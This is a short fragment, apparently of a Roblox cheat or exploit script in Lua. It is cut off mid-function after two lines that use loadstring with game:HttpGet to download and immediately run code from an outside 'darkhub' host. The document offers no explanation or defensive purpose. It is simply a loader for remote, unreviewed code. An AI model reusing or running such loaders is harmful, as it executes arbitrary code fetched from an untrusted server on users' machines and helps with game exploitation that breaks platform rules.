...
local lib = loadstring(game:HttpGet("https://darkhub.xyz/skid/detected/script.lua", true))()
local lib2 = loadstring(game:HttpGet("https://darkhub.xyz/skid/detected/modified.lua", true))()
function Info(Text)
